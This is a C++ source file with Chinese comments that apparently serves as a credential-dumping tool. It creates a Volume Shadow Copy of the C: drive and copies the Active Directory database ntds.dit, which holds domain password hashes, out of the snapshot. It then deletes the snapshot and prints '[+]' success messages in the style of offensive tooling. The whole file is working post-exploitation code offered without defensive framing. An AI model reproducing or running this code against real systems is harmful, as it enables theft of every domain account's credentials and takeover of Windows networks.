#include <Windows.h>
#include <objbase.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <comdef.h>
#include <cstdio>
#include <string>
#include <iostream>

using namespace std;
using std::wstring;

#define CHECK_HR_RETURN(HR, FUNC, RET) \
        do { \
                _com_error err(HR); \
                if (HR != S_OK) { \
                        fprintf(stderr, "Failed to call " ## FUNC ## ", %s\n", err.ErrorMessage()); \
                        return RET; \
                } \
        } while (0)

int wmain()
{
	WCHAR volume[MAX_PATH + 1] = { '\0' };
	//初始化 COM
	HRESULT rc = CoInitialize(NULL);
	CHECK_HR_RETURN(rc, "CoInitialize", -1);

	IVssBackupComponents *components = NULL;
	rc = CreateVssBackupComponents(&components);
	CHECK_HR_RETURN(rc, "CreateVssBackupComponents", -1);

	//连接到VSS
	rc = components->InitializeForBackup();
	CHECK_HR_RETURN(rc, "InitializeForBackup", -1);

	IVssAsync *async;
	rc = components->GatherWriterMetadata(&async);
	CHECK_HR_RETURN(rc, "GatherWriterMetadata", -1);
	rc = async->Wait();
	CHECK_HR_RETURN(rc, "async->Wait", -1);

	rc = components->SetContext(VSS_CTX_BACKUP);
	CHECK_HR_RETURN(rc, "SetContext", -1);

	VSS_ID snapshot_set_id;
	rc = components->StartSnapshotSet(&snapshot_set_id);
	CHECK_HR_RETURN(rc, "StartSnapshotSet", -1);

	//添加卷
	VSS_ID snapshot_id;
	rc = components->AddToSnapshotSet(L"C:\\", GUID_NULL, &snapshot_id);
	CHECK_HR_RETURN(rc, "AddToSnapshotSet", -1);

	// 生成快照
	rc = components->SetBackupState(true, false, VSS_BT_FULL, false);
	CHECK_HR_RETURN(rc, "SetBackupState", -1);

	rc = components->PrepareForBackup(&async);
	CHECK_HR_RETURN(rc, "PrepareForBackup", -1);
	rc = async->Wait();
	CHECK_HR_RETURN(rc, "async->Wait", -1);

	rc = components->DoSnapshotSet(&async);
	CHECK_HR_RETURN(rc, "DoSnapshotSet", -1);
	rc = async->Wait();
	CHECK_HR_RETURN(rc, "async->Wait", -1);

	//使用m_pwszSnapshotDeviceObject字段获取快照的设备名称（例如“ \ Device \ HarddiskVolumeShadowCopy1”）。
	//如果为D：\创建了快照，并且要访问D：\ somefile.txt，打开\ Device \ HarddiskVolumeShadowCopy1 \ somefile.txt。
	VSS_SNAPSHOT_PROP snapshot_prop;
	rc = components->GetSnapshotProperties(snapshot_id, &snapshot_prop);

	CHECK_HR_RETURN(rc, "GetSnapshotProperties", -1);

	wstring src = snapshot_prop.m_pwszSnapshotDeviceObject;
	src += L"\\";
	src += (L"windows\\NTDS\\ntds.dit" + lstrlenW(volume));
	wcout << "[+] snapshot_id:" << snapshot_prop.m_pwszSnapshotDeviceObject << endl;

	// 备份数据
	if (CopyFileW(src.c_str(), L"ntds.dit", true) == FALSE) {
		fprintf(stderr, "Failed to copyfile, src=%ls, dst=%ls, last_error=%d\n",
			src.c_str(), L"ntds.dit", GetLastError());
		return -1;
	}
	else
	{
		printf("[+] Backup file successful\n");
	}

	// 删除快照
	LONG lSnapshots = 0;
	VSS_ID idNonDeletedSnapshotID = GUID_NULL;

	rc = components->DeleteSnapshots(
		snapshot_id,
		VSS_OBJECT_SNAPSHOT,
		FALSE,
		&lSnapshots,
		&idNonDeletedSnapshotID);
	CHECK_HR_RETURN(rc, "DeleteSnapshots", -1);
	printf("[+] Delete snapshot succeeded\n");

	//释放资源
	rc = components->BackupComplete(&async);
	CHECK_HR_RETURN(rc, "BackupComplete", -1);

	rc = async->Wait();
	CHECK_HR_RETURN(rc, "async->Wait", -1);

	components->Release();
	CoUninitialize();
	return 0;
}